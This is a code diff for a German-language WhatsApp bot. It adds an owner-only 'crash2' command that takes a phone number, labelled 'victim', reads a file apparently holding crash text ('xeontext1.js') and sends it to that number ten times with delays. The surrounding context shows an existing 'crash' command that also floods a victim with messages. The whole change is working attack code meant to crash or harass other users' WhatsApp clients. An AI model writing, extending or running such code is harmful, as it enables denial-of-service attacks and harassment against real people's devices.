@@ -526,6 +526,40 @@ if (command === "crash") {
 
     reply(sock, msg, `✅ Erfolgreich ${amount} Nachrichten an ${victim} gesendet`);
 }
+if (command === "crash2") {
+    if (!isWantedasa(sender)) {
+        return reply(sock, msg, "❌ Nur Owner dürfen diesen Command nutzen!");
+    }
+
+    if (!args[0]) {
+        return reply(sock, msg, `❌ Nutzung: ${prefix}crash 49123456789`);
+    }
+
+    const victim = args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+    const amount = 10;
+
+    // absoluter Pfad zur Datei
+    const filePath = path.join(process.cwd(), "Wantedasa/wantedbot/xeontext1.js");
+
+    if (!fs.existsSync(filePath)) {
+        return reply(sock, msg, "❌ Datei nicht gefunden!");
+    }
+
+    const fileContent = fs.readFileSync(filePath, "utf-8");
+
+    async function XeonyCrashy(chat) {
+        await sock.sendMessage(chat, {
+            text: fileContent
+        });
+    }
+
+    for (let i = 0; i < amount; i++) {
+        await XeonyCrashy(victim);
+        await sleep(2000); // bisschen Delay ist stabiler
+    }
+
+    reply(sock, msg, `✅ Inhalt ${amount}x an ${victim} gesendet`);
+}
 if (command === "getpic") {
     try {
         let target;
